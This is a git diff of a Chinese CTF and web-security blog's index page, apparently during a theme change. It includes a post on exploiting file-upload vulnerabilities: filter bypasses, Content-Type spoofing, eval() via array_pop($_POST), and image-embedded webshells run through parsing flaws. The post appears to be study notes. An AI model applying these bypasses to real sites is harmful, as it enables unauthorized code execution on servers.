@@ -1,195 +1,739 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>h3110w0r1d's Blog - we can be what we are willing to be</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="h3110w0r1d&#39;s Blog">
-<meta property="og:url" content="http://dezhoutorizhao.github.io/page/7/index.html">
-<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
-<meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
-<meta property="article:author" content="h3110w0r1d">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/page/7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'h3110w0r1d\'s Blog',
-  isPost: false,
-  isHome: true,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2024-01-15 13:48:17'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
     
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
-
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
-
-        document.head.appendChild(script)
-      })
+        <meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+
+    <!--Author-->
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+        <meta name="author" content="h3110w0r1d">
     
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
+
+    <!--Open Graph Title-->
     
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">h3110w0r1d's Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-13T09:40:00.078Z" title="发表于 2022-07-13 17:40:00">2022-07-13</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">文件上传经典绕过
-  更改js代码绕过前端过滤
-  文件后缀，大小写、如果是apache，可以多写一个不能解析的后缀，php.xxxx
-  如果后端是通过content-type来进行校验的，可以将content-type修改为可以上传的文件的类型值，后端代码对应为$_FILE(“file”)
-  绕过php字符内容：使用短标签= 
-  绕过空格：使用转义字符’\t’ 或者 进行URL编码
-  绕过[]:在php中大括号和中括号等价，可以使用{}来绕过对中括号的过滤
-  绕过[]和{}：使用array_pop()函数，括号内部写传参的形式，array_pop($_POST);，以字符串的形式返回执行语句，可以配合eval()函数进行使用
-  绕过对分号的过滤：最后一句不用带分号，中间的分号可以用?&gt;来进行guo’l
+        <meta property="og:title" content="h3110w0r1d&#39;s Blog"/>
+    
 
-什么是文件上传漏洞
-存在文件上传的地方，就有可能有文件上传的漏洞
-上传一个webshell(后门)
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="h3110w0r1d&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>page - h3110w0r1d&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
 
-查找文件上传漏洞
-脚本扫描（御剑和菜刀.爬虫）
-尝试网站的应用
+    <!-- Google Analytics -->
+    
 
-利用类型常规类扫描获取上传
-扫描到敏感目录，上传地址
 
-会员中心上传后台系统上传各种途径上传CM ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/php%E8%AF%AD%E6%B3%95/" title="php基本语法复习">php基本语法复习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-11T06:48:04.799Z" title="发表于 2022-07-11 14:48:04">2022-07-11</time></span></div><div class="content">php一种创建动态交互性站点的强有力的服务端脚本语言环境：phpstudy搭建而成
-在phpstudy下的WWW下的文件夹下编写php程序
-保存到WWW的下一级目录下
-可以使用回环地址加上php文件名运行程序
-例如:127.0.0.1/文件名.php
+<meta name="generator" content="Hexo 5.4.0"></head>
 
-什么是php文件
-php文件可以包含文本、HTML、CSS、以及PHP代码
-php代码在服务器上执行，而结果以纯文本的形式返回浏览器
-文件名后缀为.php
 
-php能够做什么
-语法知识php脚本可以放在文档中的任何位置开头结尾
-php脚本以’ &lt;?php ‘开头
-以’ ?&gt; ‘结尾
+<body>
 
-内建php输出文本函数
-echo&lt;!DOCTYPE html&gt;
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">h3110w0r1d's Blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                文件上传
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-07-13</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="经典绕过"><a href="#经典绕过" class="headerlink" title="经典绕过"></a>经典绕过</h2><ol>
+<li>  更改js代码绕过前端过滤</li>
+<li>  文件后缀，大小写、如果是apache，可以多写一个不能解析的后缀，php.xxxx</li>
+<li>  如果后端是通过content-type来进行校验的，可以将content-type修改为可以上传的文件的类型值，后端代码对应为$_FILE(“file”)</li>
+<li>  绕过php字符内容：使用短标签= <?= ?></li>
+<li>  绕过空格：使用转义字符’\t’ 或者 进行URL编码</li>
+<li>  绕过[]:在php中大括号和中括号等价，可以使用{}来绕过对中括号的过滤</li>
+<li>  绕过[]和{}：使用array_pop()函数，括号内部写传参的形式，array_pop($_POST);，以字符串的形式返回执行语句，可以配合eval()函数进行使用</li>
+<li>  绕过对分号的过滤：最后一句不用带分号，中间的分号可以用?&gt;来进行guo’l</li>
+</ol>
+<h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><ol>
+<li>存在文件上传的地方，就<strong>有可能有</strong>文件上传的漏洞</li>
+<li>上传一个<strong>webshell</strong>(后门)</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713180202.png"></li>
+</ol>
+<h2 id="查找文件上传漏洞"><a href="#查找文件上传漏洞" class="headerlink" title="查找文件上传漏洞"></a>查找文件上传漏洞</h2><ol>
+<li>脚本扫描（御剑和菜刀.爬虫）</li>
+<li>尝试网站的应用</li>
+</ol>
+<h2 id="利用类型"><a href="#利用类型" class="headerlink" title="利用类型"></a>利用类型</h2><h3 id="常规类"><a href="#常规类" class="headerlink" title="常规类"></a>常规类</h3><h4 id="扫描获取上传"><a href="#扫描获取上传" class="headerlink" title="扫描获取上传"></a>扫描获取上传</h4><ol>
+<li>扫描到敏感目录，上传地址</li>
+</ol>
+<h4 id="会员中心上传"><a href="#会员中心上传" class="headerlink" title="会员中心上传"></a>会员中心上传</h4><h4 id="后台系统上传"><a href="#后台系统上传" class="headerlink" title="后台系统上传"></a>后台系统上传</h4><h4 id="各种途径上传"><a href="#各种途径上传" class="headerlink" title="各种途径上传"></a>各种途径上传</h4><h3 id="CMS类"><a href="#CMS类" class="headerlink" title="CMS类"></a>CMS类</h3><ol>
+<li>一般的文件上传不允许上传脚本格式的<h3 id="编辑器类"><a href="#编辑器类" class="headerlink" title="编辑器类"></a>编辑器类</h3></li>
+</ol>
+<h3 id="其他类-CVE"><a href="#其他类-CVE" class="headerlink" title="其他类/CVE"></a>其他类/CVE</h3><h3 id="配合解析漏洞下的文件类型后门测试3938"><a href="#配合解析漏洞下的文件类型后门测试3938" class="headerlink" title="配合解析漏洞下的文件类型后门测试3938"></a>配合解析漏洞下的文件类型后门测试3938</h3><ol>
+<li>假设上传了一个木马含在图片里的文件,直接访问上传路径解析不出来，按理来说应该解析图片的同时应该解析出phpinfo()的脚本函数，但是没有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182905.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713183140.png"></li>
+<li>在上传路径后面加上/1.php   (文件的名字不重要，重要的是文件类型是php)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713182720.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716084818.png"></li>
+<li>解析漏洞是看搭建的平台的，例如apache和nginx的</li>
+<li>nginx是可以将图片格式作为php格式执行</li>
+</ol>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h4><ol>
+<li>内容类型，一般指的是网页中存在的Content-Type，用于定义网络文件的类型和网页的编码，决定接收方以什么形式，什么编码解读这个文件</li>
+<li>ContentType属性指定响应的 HTTP内容类型。如果未指定 ContentType，默认为TEXT/HTML</li>
+<li>application/octet-stream 字节流，浏览器处理字节流的默认方式就是下载<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220716120216.png"><pre class="line-numbers language-none"><code class="language-none">最重要的1. application&#x2F;octet-stream 字节流，浏览器处理字节流的默认方式就是下载
+       2. image&#x2F;png 图片类型，将会以图片类型解析
+&quot;.*&quot;&#x3D;&quot;application&#x2F;octet-stream&quot;
+&quot;.001&quot;&#x3D;&quot;application&#x2F;x-001&quot;
+&quot;.301&quot;&#x3D;&quot;application&#x2F;x-301&quot;
+&quot;.323&quot;&#x3D;&quot;text&#x2F;h323&quot;
+&quot;.906&quot;&#x3D;&quot;application&#x2F;x-906&quot;
+&quot;.907&quot;&#x3D;&quot;drawing&#x2F;907&quot;
+&quot;.a11&quot;&#x3D;&quot;application&#x2F;x-a11&quot;
+&quot;.acp&quot;&#x3D;&quot;audio&#x2F;x-mei-aac&quot;
+&quot;.ai&quot;&#x3D;&quot;application&#x2F;postscript&quot;
+&quot;.aif&quot;&#x3D;&quot;audio&#x2F;aiff&quot;
+&quot;.aifc&quot;&#x3D;&quot;audio&#x2F;aiff&quot;
+&quot;.aiff&quot;&#x3D;&quot;audio&#x2F;aiff&quot;
+&quot;.anv&quot;&#x3D;&quot;application&#x2F;x-anv&quot;
+&quot;.asa&quot;&#x3D;&quot;text&#x2F;asa&quot;
+&quot;.asf&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;
+&quot;.asp&quot;&#x3D;&quot;text&#x2F;asp&quot;
+&quot;.asx&quot;&#x3D;&quot;video&#x2F;x-ms-asf&quot;
+&quot;.au&quot;&#x3D;&quot;audio&#x2F;basic&quot;
+&quot;.avi&quot;&#x3D;&quot;video&#x2F;avi&quot;
+&quot;.awf&quot;&#x3D;&quot;application&#x2F;vnd.adobe.workflow&quot;
+&quot;.biz&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.bmp&quot;&#x3D;&quot;application&#x2F;x-bmp&quot;
+&quot;.bot&quot;&#x3D;&quot;application&#x2F;x-bot&quot;
+&quot;.c4t&quot;&#x3D;&quot;application&#x2F;x-c4t&quot;
+&quot;.c90&quot;&#x3D;&quot;application&#x2F;x-c90&quot;
+&quot;.cal&quot;&#x3D;&quot;application&#x2F;x-cals&quot;
+&quot;.cat&quot;&#x3D;&quot;application&#x2F;s-pki.seccat&quot;
+&quot;.cdf&quot;&#x3D;&quot;application&#x2F;x-netcdf&quot;
+&quot;.cdr&quot;&#x3D;&quot;application&#x2F;x-cdr&quot;
+&quot;.cel&quot;&#x3D;&quot;application&#x2F;x-cel&quot;
+&quot;.cer&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;
+&quot;.cg4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;
+&quot;.cgm&quot;&#x3D;&quot;application&#x2F;x-cgm&quot;
+&quot;.cit&quot;&#x3D;&quot;application&#x2F;x-cit&quot;
+&quot;.class&quot;&#x3D;&quot;java&#x2F;*&quot;
+&quot;.cml&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.cmp&quot;&#x3D;&quot;application&#x2F;x-cmp&quot;
+&quot;.cmx&quot;&#x3D;&quot;application&#x2F;x-cmx&quot;
+&quot;.cot&quot;&#x3D;&quot;application&#x2F;x-cot&quot;
+&quot;.crl&quot;&#x3D;&quot;application&#x2F;pkix-crl&quot;
+&quot;.crt&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;
+&quot;.csi&quot;&#x3D;&quot;application&#x2F;x-csi&quot;
+&quot;.css&quot;&#x3D;&quot;text&#x2F;css&quot;
+&quot;.cut&quot;&#x3D;&quot;application&#x2F;x-cut&quot;
+&quot;.dbf&quot;&#x3D;&quot;application&#x2F;x-dbf&quot;
+&quot;.dbm&quot;&#x3D;&quot;application&#x2F;x-dbm&quot;
+&quot;.dbx&quot;&#x3D;&quot;application&#x2F;x-dbx&quot;
+&quot;.dcd&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.dcx&quot;&#x3D;&quot;application&#x2F;x-dcx&quot;
+&quot;.der&quot;&#x3D;&quot;application&#x2F;x-x509-ca-cert&quot;
+&quot;.dgn&quot;&#x3D;&quot;application&#x2F;x-dgn&quot;
+&quot;.dib&quot;&#x3D;&quot;application&#x2F;x-dib&quot;
+&quot;.dll&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;
+&quot;.doc&quot;&#x3D;&quot;application&#x2F;msword&quot;
+&quot;.dot&quot;&#x3D;&quot;application&#x2F;msword&quot;
+&quot;.drw&quot;&#x3D;&quot;application&#x2F;x-drw&quot;
+&quot;.dtd&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.dwf&quot;&#x3D;&quot;Model&#x2F;vnd.dwf&quot;
+&quot;.dwf&quot;&#x3D;&quot;application&#x2F;x-dwf&quot;
+&quot;.dwg&quot;&#x3D;&quot;application&#x2F;x-dwg&quot;
+&quot;.dxb&quot;&#x3D;&quot;application&#x2F;x-dxb&quot;
+&quot;.dxf&quot;&#x3D;&quot;application&#x2F;x-dxf&quot;
+&quot;.edn&quot;&#x3D;&quot;application&#x2F;vnd.adobe.edn&quot;
+&quot;.emf&quot;&#x3D;&quot;application&#x2F;x-emf&quot;
+&quot;.eml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
+&quot;.ent&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.epi&quot;&#x3D;&quot;application&#x2F;x-epi&quot;
+&quot;.eps&quot;&#x3D;&quot;application&#x2F;x-ps&quot;
+&quot;.eps&quot;&#x3D;&quot;application&#x2F;postscript&quot;
+&quot;.etd&quot;&#x3D;&quot;application&#x2F;x-ebx&quot;
+&quot;.exe&quot;&#x3D;&quot;application&#x2F;x-msdownload&quot;
+&quot;.fax&quot;&#x3D;&quot;image&#x2F;fax&quot;
+&quot;.fdf&quot;&#x3D;&quot;application&#x2F;vnd.fdf&quot;
+&quot;.fif&quot;&#x3D;&quot;application&#x2F;fractals&quot;
+&quot;.fo&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.frm&quot;&#x3D;&quot;application&#x2F;x-frm&quot;
+&quot;.g4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;
+&quot;.gbr&quot;&#x3D;&quot;application&#x2F;x-gbr&quot;
+&quot;.gcd&quot;&#x3D;&quot;application&#x2F;x-gcd&quot;
+&quot;.gif&quot;&#x3D;&quot;image&#x2F;gif&quot;
+&quot;.gl2&quot;&#x3D;&quot;application&#x2F;x-gl2&quot;
+&quot;.gp4&quot;&#x3D;&quot;application&#x2F;x-gp4&quot;
+&quot;.hgl&quot;&#x3D;&quot;application&#x2F;x-hgl&quot;
+&quot;.hmr&quot;&#x3D;&quot;application&#x2F;x-hmr&quot;
+&quot;.hpg&quot;&#x3D;&quot;application&#x2F;x-hpgl&quot;
+&quot;.hpl&quot;&#x3D;&quot;application&#x2F;x-hpl&quot;
+&quot;.hqx&quot;&#x3D;&quot;application&#x2F;mac-binhex40&quot;
+&quot;.hrf&quot;&#x3D;&quot;application&#x2F;x-hrf&quot;
+&quot;.hta&quot;&#x3D;&quot;application&#x2F;hta&quot;
+&quot;.htc&quot;&#x3D;&quot;text&#x2F;x-component&quot;
+&quot;.htm&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.html&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.htt&quot;&#x3D;&quot;text&#x2F;webviewhtml&quot;
+&quot;.htx&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.icb&quot;&#x3D;&quot;application&#x2F;x-icb&quot;
+&quot;.ico&quot;&#x3D;&quot;image&#x2F;x-icon&quot;
+&quot;.ico&quot;&#x3D;&quot;application&#x2F;x-ico&quot;
+&quot;.iff&quot;&#x3D;&quot;application&#x2F;x-iff&quot;
+&quot;.ig4&quot;&#x3D;&quot;application&#x2F;x-g4&quot;
+&quot;.igs&quot;&#x3D;&quot;application&#x2F;x-igs&quot;
+&quot;.iii&quot;&#x3D;&quot;application&#x2F;x-iphone&quot;
+&quot;.img&quot;&#x3D;&quot;application&#x2F;x-img&quot;
+&quot;.ins&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;
+&quot;.isp&quot;&#x3D;&quot;application&#x2F;x-internet-signup&quot;
+&quot;.IVF&quot;&#x3D;&quot;video&#x2F;x-ivf&quot;
+&quot;.java&quot;&#x3D;&quot;java&#x2F;*&quot;
+&quot;.jfif&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
+&quot;.jpe&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
+&quot;.jpe&quot;&#x3D;&quot;application&#x2F;x-jpe&quot;
+&quot;.jpeg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
+&quot;.jpg&quot;&#x3D;&quot;image&#x2F;jpeg&quot;
+&quot;.jpg&quot;&#x3D;&quot;application&#x2F;x-jpg&quot;
+&quot;.js&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;
+&quot;.jsp&quot;&#x3D;&quot;text&#x2F;html&quot;
+&quot;.la1&quot;&#x3D;&quot;audio&#x2F;x-liquid-file&quot;
+&quot;.lar&quot;&#x3D;&quot;application&#x2F;x-laplayer-reg&quot;
+&quot;.latex&quot;&#x3D;&quot;application&#x2F;x-latex&quot;
+&quot;.lavs&quot;&#x3D;&quot;audio&#x2F;x-liquid-secure&quot;
+&quot;.lbm&quot;&#x3D;&quot;application&#x2F;x-lbm&quot;
+&quot;.lmsff&quot;&#x3D;&quot;audio&#x2F;x-la-lms&quot;
+&quot;.ls&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;
+&quot;.ltr&quot;&#x3D;&quot;application&#x2F;x-ltr&quot;
+&quot;.m1v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
+&quot;.m2v&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
+&quot;.m3u&quot;&#x3D;&quot;audio&#x2F;mpegurl&quot;
+&quot;.m4e&quot;&#x3D;&quot;video&#x2F;mpeg4&quot;
+&quot;.mac&quot;&#x3D;&quot;application&#x2F;x-mac&quot;
+&quot;.man&quot;&#x3D;&quot;application&#x2F;x-troff-man&quot;
+&quot;.math&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.mdb&quot;&#x3D;&quot;application&#x2F;msaccess&quot;
+&quot;.mdb&quot;&#x3D;&quot;application&#x2F;x-mdb&quot;
+&quot;.mfp&quot;&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;
+&quot;.mht&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
+&quot;.mhtml&quot;&#x3D;&quot;message&#x2F;rfc822&quot;
+&quot;.mi&quot;&#x3D;&quot;application&#x2F;x-mi&quot;
+&quot;.mid&quot;&#x3D;&quot;audio&#x2F;mid&quot;
+&quot;.midi&quot;&#x3D;&quot;audio&#x2F;mid&quot;
+&quot;.mil&quot;&#x3D;&quot;application&#x2F;x-mil&quot;
+&quot;.mml&quot;&#x3D;&quot;text&#x2F;xml&quot;
+&quot;.mnd&quot;&#x3D;&quot;audio&#x2F;x-musicnet-download&quot;
+&quot;.mns&quot;&#x3D;&quot;audio&#x2F;x-musicnet-stream&quot;
+&quot;.mocha&quot;&#x3D;&quot;application&#x2F;x-javascript&quot;
+&quot;.movie&quot;&#x3D;&quot;video&#x2F;x-sgi-movie&quot;
+&quot;.mp1&quot;&#x3D;&quot;audio&#x2F;mp1&quot;
+&quot;.mp2&quot;&#x3D;&quot;audio&#x2F;mp2&quot;
+&quot;.mp2v&quot;&#x3D;&quot;video&#x2F;mpeg&quot;
+&quot;.mp3&quot;&#x3D;&quot;audio&#x2F;mp3&quot;
+&quot;.mp4&quot;&#x3D;&quot;video&#x2F;mp4&quot;
+&quot;.mpa&quot;&#x3D;&quot;video&#x2F;x-mpg&quot;
+&quot;.mpd&quot;&#x3D;&quot;application&#x2F;-project&quot;
+&quot;.mpe&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
+&quot;.mpeg&quot;&#x3D;&quot;video&#x2F;mpg&quot;
+&quot;.mpg&quot;&#x3D;&quot;video&#x2F;mpg&quot;
+&quot;.mpga&quot;&#x3D;&quot;audio&#x2F;rn-mpeg&quot;
+&quot;.mpp&quot;&#x3D;&quot;application&#x2F;-project&quot;
+&quot;.mps&quot;&#x3D;&quot;video&#x2F;x-mpeg&quot;
+&quot;.mpt&quot;&#x3D;&quot;application&#x2F;-project&quot;
+&quot;.mpv&quot;&#x3D;&quot;video&#x2F;mpg&quot;
+&quot;.mpv2&quot;&#x3D;&quot;video&#x2F;mpeg&quot;
+&quot;.mpw&quot;&#x3D;&quot;application&#x2F;s-project&quot;
